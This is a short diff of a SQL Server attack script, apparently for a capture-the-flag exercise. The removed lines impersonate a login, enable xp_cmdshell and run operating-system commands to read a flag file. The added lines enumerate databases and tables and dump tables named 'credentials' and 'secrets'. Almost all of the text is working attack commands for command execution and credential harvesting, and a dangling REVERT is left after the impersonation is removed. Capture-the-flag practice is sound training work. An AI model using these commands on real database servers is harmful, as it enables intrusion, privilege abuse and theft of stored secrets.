@@ -1,9 +1,11 @@
-EXECUTE AS LOGIN = 'appdev';
+
+SELECT name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msdb');
 GO
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+USE [EighteenDB];  -- Replace with actual DB name from output
+SELECT table_name FROM information_schema.tables;
 GO
-EXEC xp_cmdshell 'whoami /user && hostname && type C:\flag.txt';
+SELECT * FROM credentials;  -- Common CTF table
+SELECT * FROM secrets;
 GO
 REVERT;
 GO
